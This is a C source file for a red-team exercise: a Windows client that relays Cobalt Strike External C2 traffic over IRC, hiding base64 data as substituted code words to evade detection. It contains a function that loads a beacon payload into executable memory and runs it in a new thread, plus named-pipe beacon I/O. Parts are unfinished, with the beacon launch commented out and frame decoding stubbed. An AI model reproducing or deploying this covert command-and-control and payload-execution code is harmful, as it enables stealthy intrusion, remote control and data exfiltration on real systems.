/**
 * IRCExternalC2.c
 * by Lt Daniel Fitzgerald
 * Red Flag 19-3 - July 2019
 * 
 * Program to provide covert communications over IRC for Cobalt Strike using the External C2 feature.
 */

#define _CRT_SECURE_NO_WARNINGS

#pragma comment (lib, "Ws2_32.lib")

#include <winsock2.h>
#include <ws2tcpip.h>
#include <stdio.h> 
#include <stdlib.h>
#include <time.h>
#include "base64.h"

#define MAX 1024
#define B64MAX 2048
#define SA struct sockaddr


// Struct to hold info on the IRC session
struct IRCinfo
{
	char NICK[50];
	char PASS[50];
	char USER[50];
	char REALNAME[50];
	char CHANNEL[50];
	char TGTNICK[50];
};


// Array of Base64 characters
char array64[] = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789/+=";
/*
char cipherarray[65][11] =
{
	"apple     ",
	"bob       ",
	"carrot    ",
	"dessert   ",
	"eagle     ",
	"fan       ",
	"good      ",
	"happy     ",
	"ice       ",
	"juice     ",
	"kiwi      ",
	"lucky     ",
	"mini      ",
	"nickle    ",
	"open      ",
	"process   ",
	"query     ",
	"recursive ",
	"sort      ",
	"truncate  ",
	"under     ",
	"vacate    ",
	"window    ",
	"xxx       ",
	"yellow    ",
	"zebra     ",
	"Alpha     ",
	"Bravo     ",
	"Charlie   ",
	"Delta     ",
	"Echo      ",
	"Foxtrot   ",
	"Golf      ",
	"Hotel     ",
	"India     ",
	"Julliett  ",
	"Kilo      ",
	"Lima      ",
	"Mike      ",
	"November  ",
	"Oscar     ",
	"Papa      ",
	"Qubec     ",
	"Romeo     ",
	"Sierra    ",
	"Tango     ",
	"Uniform   ",
	"Victor    ",
	"Whisky    ",
	"XRay      ",
	"Yankee    ",
	"Zulu      ",
	"zero      ",
	"one       ",
	"two       ",
	"three     ",
	"four      ",
	"five      ",
	"six       ",
	"seven     ",
	"eight     ",
	"nine      ",
	"slash     ",
	"plus      ",
	"equal     "
};*/
// Array of strings for Cloakify
char cipherarray[65][11] =
{
	"apple",
	"bob",
	"carrot",
	"dessert",
	"eagle",
	"fan",
	"good",
	"happy",
	"ice",
	"juice",
	"kiwi",
	"lucky",
	"mini",
	"nickle",
	"open",
	"process",
	"query",
	"recursive",
	"sort",
	"truncate",
	"under",
	"vacate",
	"window",
	"xxx",
	"yellow",
	"zebra",
	"Alpha",
	"Bravo",
	"Charlie",
	"Delta",
	"Echo",
	"Foxtrot",
	"Golf",
	"Hotel",
	"India",
	"Julliett",
	"Kilo",
	"Lima",
	"Mike",
	"November",
	"Oscar",
	"Papa",
	"Qubec",
	"Romeo",
	"Sierra",
	"Tango",
	"Uniform",
	"Victor",
	"Whisky",
	"XRay",
	"Yankee",
	"Zulu",
	"zero",
	"one",
	"two",
	"three",
	"four",
	"five",
	"six",
	"seven",
	"eight",
	"nine",
	"slash",
	"plus",
	"equal"
};

/**
 * Cloakifies character to a string based off of the cipherarray and array64
 *
 * @param input Character to be converted to a cloakified string
 * @return pointer to cloakified string or NULL on failure
 */
char* cloakify(char input)
{
	// Pointer to first occurance of input in array64
	const char* ptr = strchr(array64, input);
	// If found
	if (ptr) 
	{
		// Index to character in array64
		int index = ptr - array64;
		// Map to cloakify cipher
		return cipherarray[index];
	}
	return NULL;
}


/**
 * De-cloakifies strings back to the original characters based off of the cipherarray and array64
 *
 * @param msgptr Pointer to a buffer containing the string to be de-cloakified
 * @param b64char Pointer to a buffer to store the resulting Base64 character in
 * @return 0 on success, 1 on failure
 */
int decloakify(char* msgptr, char* b64char)
{
	int offset = 0;
	int flag = 0;
	// 65 is tied to cipherarray (length)
	for (int i = 0; i < 65; i++)
	{
		if (strstr(cipherarray[i], msgptr))
		{
			offset = i;
			//printf("msgptr:%s\n", msgptr);
			//printf("cipherarray[offset]:%s\n", cipherarray[i]);
			//printf("offset : %i\n", offset);
			flag = 1;
			break;
		}
	}
	
	if (flag == 1)
	{
		char b64 = array64[offset];
		memcpy(b64char, &b64, 1);
		return 0;
	}
	else
	{
		return 1;
	}
}


/**
 * Formats variable arguments into a buffer and sends them to the IRC server
 *
 * @param sockfd A socket file descriptor
 * @param text, ... Variable arguments to format and store into a buffer
 * @note Windows Only Implementation
 * @return number of bytes sent
 */
int sendargv(SOCKET sockfd, char* text, ...)
{
	static char sendbuff[MAX];
	memset(sendbuff, 0, sizeof(sendbuff));
	va_list ap;
	va_start(ap, text);
	vsprintf(sendbuff, text, ap);
	va_end(ap);

	return send(sockfd, sendbuff, strlen(sendbuff), 0);
}


/**
 * Gets local time and stores it in a buffer
 *
 * @return tmpbuf A pointer to a buffer with localtime in it (HH:MM:SS)
 */
char* gettime()
{
	char tmpbuf[50];
	_strtime_s(tmpbuf, 50);
	return tmpbuf;
}


/**
 * Parses message into characters and runs cloakify on it. Then formats for sending to IRC server and calls send function
 *
 * @param sockfd A socket file descriptor
 * @param message Pointer to a buffer containing a Base64 encoded string to be cloakified
 * @param ircinfo A struct with the users IRC info (such as NICK and CHANNEL)
 * @note Windows Only Implementation
 */
void runcloakify(SOCKET sockfd, char* message, struct IRCinfo ircinfo)
{
	int msglen = strlen(message);
	for (int i = 0; i < msglen; i++)
	{
		char* cloakifiedString = cloakify(message[i]);
		char* timeBuff = gettime();
		char sendBuff[150];
		strcpy(sendBuff, timeBuff);
		strcat(sendBuff, "-");
		strcat(sendBuff, cloakifiedString);
		sendargv(sockfd, "PRIVMSG %s :T-%s\r\n", ircinfo.CHANNEL, sendBuff);
		Sleep(50);
	}
}


/**
 * Allocates a RWX page for the CS beacon, copies the payload, and starts a new thread
 *
 * @param payload Pointer to a buffer containing a Cobalt Strike beacon payload to be alloc'd and run
 * @param len Length of the payload buffer
 * @note Windows Only Implementation
 */
void spawnBeacon(char* payload, DWORD len) 
{

	HANDLE threadHandle;
	DWORD threadId = 0;
	char* alloc = (char*)VirtualAlloc(NULL, len, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
	if (alloc != NULL)
	{
		memcpy(alloc, payload, len);

		threadHandle = CreateThread(NULL, (SIZE_T)NULL, (LPTHREAD_START_ROUTINE)alloc, NULL, 0, &threadId);
	}
}


/**
 * Connects to the name pipe spawned by the injected beacon
 *
 * @param pipeName Pointer to a buffer containing the name of the pipe to connect to
 * @note Windows Only Implementation
 * @return A handle to the beacon SMB pipe
 */
HANDLE connectBeaconPipe(const char* pipeName) 
{
	HANDLE beaconPipe;

	beaconPipe = CreateFileA(pipeName, GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, (DWORD)NULL, NULL);

	return beaconPipe;
}


/**
 * Receives data from our injected beacon via a named pipe
 *
 * @param pipe Handle to beacons SMB pipe
 * @param buffer Pointer to buffer data will be read into
 * @note Windows Only Implementation
 * @return Length of buffer containing received data
 */
DWORD recvFromBeacon(HANDLE pipe, char* buffer) 
{
	DWORD len = 0, bytesRead = 0, totalLen = 0;
	BOOL result;

	result = ReadFile(pipe, (char *)&len, 4, &bytesRead, NULL);
	if (!result)
	{
		printf("ReadFile Failed!\n");
	}

	while (totalLen < len) {
		result = ReadFile(pipe, buffer + totalLen, len - totalLen, &bytesRead, NULL);
		if (!result)
		{
			printf("ReadFile Failed!\n");
		}
		totalLen += bytesRead;
	}
	return len;
}


/**
 * Write data to our injected beacon via a named pipe
 *
 * @param pipe Handle to beacons SMB pipe
 * @param data Pointer to buffer containing data to be written to pipe
 * @param len Length of data to be written to pipe
 * @note Windows Only Implementation
 */
void sendToBeacon(HANDLE pipe, const char* data, DWORD len) 
{
	DWORD bytesWritten = 0;
	WriteFile(pipe, &len, 4, &bytesWritten, NULL);
	WriteFile(pipe, data, len, &bytesWritten, NULL);
}


/**
 * Base64 encode data and run Cloakify to send to IRC Server
 *
 * @param sockfd A socket file descriptor
 * @param payloadData Pointer to buffer containing ExternalC2 frame to send to team server
 * @param payloadLen Length of data in ExternalC2 frame
 * @param ircinfo A struct with the users IRC info (such as NICK and CHANNEL)
 * @note Windows Only Implementation
 */
void sendData(SOCKET sockfd, char* payloadData, DWORD payloadLen, struct IRCinfo ircinfo)
{
	int b64len;
	sendargv(sockfd, "PRIVMSG %s :Sending msg %s\r\n", ircinfo.CHANNEL, payloadData);
	char* encodedmsg = base64(payloadData, strlen(payloadData), &b64len);
	printf("Encoded Msg: %s\n", encodedmsg);
	sendargv(sockfd, "PRIVMSG %s :Sending encoded msg %s\r\n", ircinfo.CHANNEL, encodedmsg);
	runcloakify(sockfd, encodedmsg, ircinfo);
}


/**
 * Packs payload data into an ExternalC2 frame
 *
 * @param payloadData Pointer to buffer containing payload data to be packed
 * @param payloadLen Length of data to be packed
 * @note Windows Only Implementation
 */
void encodeframe(char* payloadData, DWORD payloadLen)
{
	char* temp = (char*)malloc(payloadLen);
	if (temp == NULL)
	{
		printf("temp buffer malloc in encodeframe() failed!\n");
		return;
	}
	strcpy(temp, payloadData);
	memset(payloadData, 0, sizeof(payloadData));
	strncpy(payloadData, (char*)& payloadLen, 4);
	strncpy(payloadData, temp, payloadLen);
	free(temp);
}


/**
 * Extracts payload data from ExternalC2 frame
 *
 * @param decodedmsg Pointer to buffer containing decoded ExternalC2 frame
 * @param payloadData Pointer to buffer payload data will be stored in
 * @note Windows Only Implementation
 * @return Returns length of payload data
 */
DWORD decodeframe(char* decodedmsg, char* payloadData) 
{
	DWORD payloadLen = 0;

	//TODO

	return payloadLen;
}


/**
 * Sets up initial connection to IRC server
 *
 * @param sockfd A socket file descriptor
 * @param ircinfo A struct with the users IRC info (such as NICK and CHANNEL)
 * @note Windows Only Implementation
 */
void ircconnect(SOCKET sockfd, struct IRCinfo ircinfo)
{
	sendargv(sockfd, "PASS %s\r\n", ircinfo.PASS);
	sendargv(sockfd, "NICK %s\r\n", ircinfo.NICK);
	sendargv(sockfd, "USER %s %s %s :%s\r\n", ircinfo.USER, "0", "*", ircinfo.REALNAME);

	char recvbuff[MAX];
	for (;;) 
	{
		memset(recvbuff, 0, sizeof(recvbuff));
		recv(sockfd, recvbuff, sizeof(recvbuff), 0);
		printf("From Server : %s", recvbuff);

		if (recvbuff[strlen(recvbuff) - 1] == '\n')
		{
			recvbuff[strlen(recvbuff) - 1] = '\0';
		}
		if (strstr(recvbuff, "MODE "))
		{
			printf("Connection done?\n");
			break;
		}
		if (strstr(recvbuff, "PING :"))
		{
			printf("PING! sending PONG.\n");
			char* pingsvr = strstr(recvbuff, "PING :");
			pingsvr += strlen("PING :");
			sendargv(sockfd, "PONG :%s\n", pingsvr);
		}
	}
	
	sendargv(sockfd, "USERHOST %s\r\n", ircinfo.USER);
	memset(recvbuff, 0, sizeof(recvbuff));
	recv(sockfd, recvbuff, sizeof(recvbuff), 0);
	printf("From Server : %s", recvbuff);
}


/**
 * Sends the command to join to a channel
 *
 * @param sockfd A socket file descriptor
 * @param ircinfo A struct with the users IRC info (such as NICK and CHANNEL)
 */
void becomeoper(SOCKET sockfd, struct IRCinfo ircinfo)
{
	sendargv(sockfd, "OPER %s %s\r\n", ircinfo.NICK, ircinfo.PASS);
}


/**
 * Sends the command to join to a channel
 *
 * @param sockfd A socket file descriptor
 * @param ircinfo A struct with the users IRC info (such as NICK and CHANNEL)
 */
void ircjoin(SOCKET sockfd, struct IRCinfo ircinfo)
{
	sendargv(sockfd, "JOIN %s\r\n", ircinfo.CHANNEL);
}


/**
 * Sends the command to start c2
 *
 * @param sockfd A socket file descriptor
 * @param ircinfo A struct with the users IRC info (such as NICK and CHANNEL)
 */
void cloakstart(SOCKET sockfd, struct IRCinfo ircinfo)
{
	sendargv(sockfd, "PRIVMSG %s :cloak\r\n", ircinfo.CHANNEL);
}


/**
 * Implements IRC functionality. Contains the main read loop
 *
 * @param sockfd A socket file descriptor
 * @param ircinfo A struct with the users IRC info (such as NICK and CHANNEL)
 * @note Windows Only Implementation
 */
void irc(SOCKET sockfd, struct IRCinfo ircinfo)
{
	// Connect to IRC application
	ircconnect(sockfd, ircinfo);
	// Join a channel
	ircjoin(sockfd, ircinfo);
	// Send command to become operator
	becomeoper(sockfd, ircinfo);

	// Set up buffers
	char recvbuff[MAX];
	int equalflag = 0;
	BOOL payload_recv = FALSE;
	HANDLE beaconPipe = INVALID_HANDLE_VALUE;
	char b64msg[B64MAX];
	memset(b64msg, 0, sizeof(b64msg));

	// Set up strings to search for in incomming messages
	char* privMsg = "PRIVMSG ";
	char privChanPingMsg[64];
	sprintf(privChanPingMsg, "PRIVMSG %s :ping", ircinfo.CHANNEL);
	char privDmPingMsg[64];
	sprintf(privDmPingMsg, "PRIVMSG %s :ping", ircinfo.NICK);
	char privChanCloakMsg[68];
	sprintf(privChanCloakMsg, "PRIVMSG %s :%s cloakify", ircinfo.CHANNEL, ircinfo.NICK);
	char privDmCloakMsg[68];
	sprintf(privDmCloakMsg, "PRIVMSG %s :cloakify", ircinfo.CHANNEL);
	char privDmDecloakMsg[62];
	sprintf(privDmDecloakMsg, "PRIVMSG %s :T-", ircinfo.CHANNEL);
	char privDmExitMsg[64];
	sprintf(privDmExitMsg, "PRIVMSG %s :exit", ircinfo.NICK);
	char privChanExitMsg[64];
	sprintf(privChanExitMsg, "PRIVMSG %s :exit", ircinfo.CHANNEL);

	// Send command to tell server to connect to Team Server and send beacon payload
	Sleep(1000);
	cloakstart(sockfd, ircinfo);

	// TODO: Threading for listen loop
	// Main listen loop
	while (1) {
		// Reset buffer to 0 and recv from socket
		memset(recvbuff, 0, sizeof(recvbuff));
		recv(sockfd, recvbuff, sizeof(recvbuff), 0);
		printf("From Server : %s", recvbuff);
		
		// Null terminate buffer
		if (recvbuff[strlen(recvbuff) - 1] == '\n')
		{
			recvbuff[strlen(recvbuff) - 1] = '\0';
		}

		char* cloakptr = strstr(recvbuff, privDmDecloakMsg);

		// Check if PING message and respond
		if (strstr(recvbuff, "PING :"))
		{
			printf("PING! sending PONG.\n");
			char* pingsvr = strstr(recvbuff, "PING :");
			pingsvr += strlen("PING :");
			sendargv(sockfd, "PONG :%s\n", pingsvr);
		}

		// Check if cloakified message
		else if (cloakptr)
		{
			char* msg_end = "\0";
			while (strlen(cloakptr) > 2)
			{
				// printf("CLOAKMSG!!!!\n");
				cloakptr += strlen(privDmDecloakMsg);
				// HH:MM:SS- is 9 characters
				cloakptr += 9;
				// Find end of message (\r\n but the final \n of the packet has been changed to \0)
				msg_end = strstr(cloakptr, "\r");
				// Calculate length of message
				int msg_len = msg_end - cloakptr;
				// printf("msg_len: %d\n", msg_len);
				// Increment msg_end to either end of message or to 1 character before next message
				msg_end += 1;
				// Null terminate it so we can use cloakptr as the message string
				if (cloakptr != NULL && cloakptr[msg_len] != '\0')
				{
					cloakptr[msg_len] = '\0';
				}

				char b64char = '\0';
				int error = decloakify(cloakptr, &b64char);
				// printf("\nCloakptr Len: %d\n\n", strlen(cloakptr));
				if (!error)
				{
					//printf("b64char: %c\n", b64char);
					strncat(b64msg, &b64char, 1);
					char equal = '=';

					if (b64char == equal && equalflag == 0)
					{
						equalflag = 1;
					}

					else if (b64char == equal && equalflag == 1)
					{
						equalflag = 0;
						printf("Base64 string: %s\n", b64msg);
						char zerobyte = '\0';
						strncat(b64msg, &zerobyte, 1);
						int unb64len;
						sendargv(sockfd, "PRIVMSG %s :Recieved encoded msg %s\r\n", ircinfo.CHANNEL, b64msg);
						char* decodedmsg = unbase64(b64msg, strlen(b64msg) + 1, &unb64len);
						printf("Decoded msg: %s\n", decodedmsg);
						sendargv(sockfd, "PRIVMSG %s :Recieved decoded msg %s\r\n", ircinfo.CHANNEL, decodedmsg);
						memset(b64msg, 0, sizeof(b64msg));
						/*
						char* payloadData = (char *)malloc(MAX);
						if (payloadData == NULL)
						{
							printf("payloadData malloc failed!\n");
							// break;
						}
						DWORD payloadLen = 0;

						// Decoded message is in the form of an ExternalC2 frame
						payloadLen = decodeframe(decodedmsg, payloadData);

						if (!payload_recv)
						{
							// Start the CS beacon
							spawnBeacon(payloadData, payloadLen);

							// Loop until the pipe is up and ready to use
							while (beaconPipe == INVALID_HANDLE_VALUE) {
								// Create our IPC pipe for talking to the C2 beacon
								Sleep(500);
								beaconPipe = connectBeaconPipe("\\\\.\\pipe\\mIRC");
							}

							payload_recv = TRUE;
						}
						else
						{
							sendToBeacon(beaconPipe, payloadData, payloadLen);
						}

						payloadLen = 0;

						// WARNING: This should block until Beacon writes to pipe!!! May miss IRC PING if not multi-threaded.
						payloadLen = recvFromBeacon(beaconPipe, payloadData);
						//if (payloadLen == 0)
						//{
						//	free(payloadData);
						//	break;
						//}

						//Encode payload into an ExternalC2 frame before sending
						encodeframe(payloadData, payloadLen);
						sendData(sockfd, payloadData, payloadLen, ircinfo);
						free(payloadData);

						*/
					}
				}

				else
				{
					printf("Error: non-cipherarray string\n");
				}

				if (strlen(msg_end) < 2)
				{
					// printf("1 message packet\n");
					break;
				}
				else
				{
					// printf("Multi message packet\n");
				}
				cloakptr = strstr(msg_end, privDmDecloakMsg);
			}
		}

		// Check if 'cloakify' message
		else if (strstr(recvbuff, privDmCloakMsg))
		{
			char testmsg[] = "Testing";
			printf("Msg: %s\n", testmsg);
			int b64len;
			sendargv(sockfd, "PRIVMSG %s :Sending msg %s\r\n", ircinfo.CHANNEL, testmsg);
			char* encodedmsg = base64(testmsg, strlen(testmsg), &b64len);
			printf("Encoded Msg: %s\n", encodedmsg);
			sendargv(sockfd, "PRIVMSG %s :Sending encoded msg %s\r\n", ircinfo.CHANNEL, encodedmsg);
			runcloakify(sockfd, encodedmsg, ircinfo);
		}

		// Check if '[nick] cloakify' message
		else if (strstr(recvbuff, privChanCloakMsg))
		{
			sendargv(sockfd, "PRIVMSG %s :Requesting cloaked msg\r\n", ircinfo.CHANNEL);
			sendargv(sockfd, "PRIVMSG %s :cloakify\r\n", ircinfo.TGTNICK);
		}

		// Check if exit message in DM or channel
		else if (strstr(recvbuff, privDmExitMsg) || strstr(recvbuff, privChanExitMsg))
		{
			sendargv(sockfd, "PRIVMSG %s :quitting\r\n", ircinfo.CHANNEL);
			sendargv(sockfd, "QUIT :\r\n");
		}

		// Check if channel ping message
		else if (strstr(recvbuff, privChanPingMsg))
		{
			sendargv(sockfd, "PRIVMSG %s :pong\r\n", ircinfo.CHANNEL);
		}

		// Check if DM ping message
		else if (strstr(recvbuff, privDmPingMsg))
		{
			sendargv(sockfd, "PRIVMSG %s :pong\r\n", ircinfo.CHANNEL);
		}

		// Check if ERROR message
		else if (strstr(recvbuff, "ERROR"))
		{
			printf("Server sent Error...\n");
			if (strstr(recvbuff, "Closing Link"))
			{
				printf("Error was to close link!\n");
			}
			break;
		}
	}
}

/**
 * Main function. Connects to server over TCP and calls irc() function
 *
 * @note Windows Only Implementation
 * @return 0 on success, 1 on failure
 */
int main(int argc, char *argv[])
{
	// TODO: Make these passed by commandline argument
	// Set connection and IRC info
	/*
	char* IP = "127.0.0.1";
	char* PORT = "6667";
	struct IRCinfo ircinfo;
	strcpy(ircinfo.NICK, "bot");
	strcpy(ircinfo.PASS, "bot");
	strcpy(ircinfo.USER, "covert");
	strcpy(ircinfo.REALNAME, "covertIRC");
	strcpy(ircinfo.CHANNEL, "#bot");
	strcpy(ircinfo.TGTNICK, "servbot");
	*/
	if (argc != 9)
	{
		printf("Incorrect number of args: %d\n", argc);
		printf("Incorrect number of args: IRCexternalC2.exe [IP] [PORT] [NICK] [PASS] [USER] [REALNAME] [CHANNEL] [TGTNICK]");
		return 1;
	}
	char* IP = argv[1];
	char* PORT = argv[2];
	struct IRCinfo ircinfo;
	strcpy(ircinfo.NICK, argv[3]);
	strcpy(ircinfo.PASS, argv[4]);
	strcpy(ircinfo.USER, argv[5]);
	strcpy(ircinfo.REALNAME, argv[6]);
	strcpy(ircinfo.CHANNEL, argv[7]);
	strcpy(ircinfo.TGTNICK, argv[8]);

	int iResult;
	SOCKET ConnectSocket = INVALID_SOCKET;
	WSADATA wsaData;
	struct addrinfo* result = NULL, * ptr = NULL, hints;

	// Initialize Winsock
	iResult = WSAStartup(MAKEWORD(2, 2), &wsaData);
	if (iResult != 0) {
		printf("WSAStartup failed with error: %d\n", iResult);
		return 1;
	}

	ZeroMemory(&hints, sizeof(hints));
	hints.ai_family = AF_UNSPEC;
	hints.ai_socktype = SOCK_STREAM;
	hints.ai_protocol = IPPROTO_TCP;

	// Resolve the server address and port
	iResult = getaddrinfo(IP, PORT, &hints, &result);
	if (iResult != 0) {
		printf("getaddrinfo failed: %d\n", iResult);
		WSACleanup();
		return 1;
	}

	// Attempt to connect to the first address returned by the call to getaddrinfo
	ptr = result;

	// Create a SOCKET for connecting to server
	ConnectSocket = socket(ptr->ai_family, ptr->ai_socktype, ptr->ai_protocol);
	if (ConnectSocket == INVALID_SOCKET) {
		printf("Error at socket(): %ld\n", WSAGetLastError());
		freeaddrinfo(result);
		WSACleanup();
		return 1;
	}

	// Connect to server.
	iResult = connect(ConnectSocket, ptr->ai_addr, (int)ptr->ai_addrlen);
	if (iResult == SOCKET_ERROR) {
		closesocket(ConnectSocket);
		ConnectSocket = INVALID_SOCKET;
	}

	// free the resources returned by getaddrinfo and print an error message
	freeaddrinfo(result);

	if (ConnectSocket == INVALID_SOCKET) {
		printf("Unable to connect to server!\n");
		WSACleanup();
		return 1;
	}

	// IRC function for chat 
	irc(ConnectSocket, ircinfo);

	// close the socket 
	closesocket(ConnectSocket);
	return 0;
}
